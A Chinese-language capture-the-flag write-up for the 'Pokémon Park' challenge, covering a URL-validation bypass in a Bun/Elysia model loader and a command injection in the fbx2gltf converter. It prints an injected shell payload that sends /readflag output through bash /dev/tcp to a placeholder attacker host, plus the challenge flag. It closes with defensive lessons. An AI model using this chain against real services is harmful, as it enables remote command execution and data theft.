# Pokémon Park

## 题目简述

Elysia/Bun 应用通过 `/api/model?filename=...` 加载 Pokémon 模型。以 `glTF` 开头的 GLB 会直接返回；以 `Kaydara FBX Binary` 开头的 FBX 则先写入 `/tmp`，再交给 npm 包 `fbx2gltf` 0.9.7-p1 调用原生转换器。容器以非 root 的 `bun` 用户运行，`/readflag` 只有执行权限，因此必须在容器内获得命令执行，而不是直接通过路径穿越读取 flag。

## 解题过程

### 绕过模型来源校验

`loadModel` 的验证对象与实际获取对象不一致：

```typescript
let filename = decodeURIComponent(path).split("file://").pop()
if (!filename.startsWith(MODELS_DIR) || !Bun.file(filename).exists()) {
    throw new Error("invalid model path")
}
let file = await fetch(path)
```

验证只取最后一个 `file://` 后缀，确认它指向现有本地模型；真正下载时却对原始 `path` 执行 `fetch`。因此构造：

```text
https://attacker/meow.fbx%3Fmeow=file:///app/models/pm0001_00.glb
```

Elysia 解析查询串后，传给 `loadModel` 的值等价于：

```text
https://attacker/meow.fbx?meow=file:///app/models/pm0001_00.glb
```

再次解码和按 `file://` 切分后，本地检查只看到确实存在的 `/app/models/pm0001_00.glb`；真正的 `fetch(path)` 却仍访问整个攻击者 HTTPS URL。这样可把任意响应体送进转换逻辑。响应必须保留 FBX 二进制魔数，否则 `toGlb` 会在进入依赖库前以“不支持的格式”拒绝。

### 触发转换器 0-day

官方 `meow.fbx` 在 `NodeAttribute` 名称中放入：

```text
09;exec /bin/bash -c '/readflag > /dev/tcp/ATTACKER_IP/PORT'
```

文件中实际重复布置了 `09`、`10`、`11`、`12` 四个带相同 shell 片段的 `NodeAttribute`，用于稳定命中转换路径。`fbx2gltf` 处理这些恶意名称时触发未公开修复的命令注入，继而执行 `/bin/bash -c ...`。手工构造时只需替换回连地址，并由攻击者 Web 服务按原样返回该二进制 FBX。

先在公网主机监听目标端口，再请求 `/api/model`。HTTP 接口本身多半返回转换失败或 500，但 shell 已在原生转换器进程中执行；`/readflag` 的标准输出通过 Bash 的 `/dev/tcp` 重定向回监听端。官方 `meow.py` 只负责发出上述请求，真正的利用载荷位于同目录的 `meow.fbx`，不能只运行脚本而忽略模型文件。

最终得到：

```text
SEKAI{wh00p5_s0rry_zuck_m4yb3_u_sh0u1d_h4v3_4rch1v3d_th4t_r3p0_1f_u_w3r3nt_g0nn4_m4intain_i7___btw_pl3as3_0p3n_4_t1ck3t_w1th_ur_s0lu7i0n}
```

## 方法总结

这是“验证对象与使用对象分离”加原生转换器命令注入的组合，因此放在 Web 类比原仓库的 Misc 更能体现入口和主利用链。URL 校验必须作用于最终被获取的同一个规范化 URL，不能从字符串中截取一个看似安全的 `file://` 后缀；对不可信模型的转换还应禁用出站网络、移除 shell 和多余可执行文件，并放入一次性低权限沙箱。
